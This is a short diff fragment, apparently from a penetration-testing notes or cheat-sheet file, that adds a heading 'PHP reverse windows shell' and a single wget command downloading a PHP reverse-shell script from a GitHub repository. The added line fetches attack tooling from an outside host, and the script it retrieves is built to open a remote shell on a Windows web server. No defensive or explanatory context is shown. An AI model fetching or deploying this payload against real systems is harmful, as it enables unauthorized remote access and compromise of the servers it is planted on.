@@ -6,3 +6,6 @@
 
 
 
+## PHP reverse windows shell
+
+    wget https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
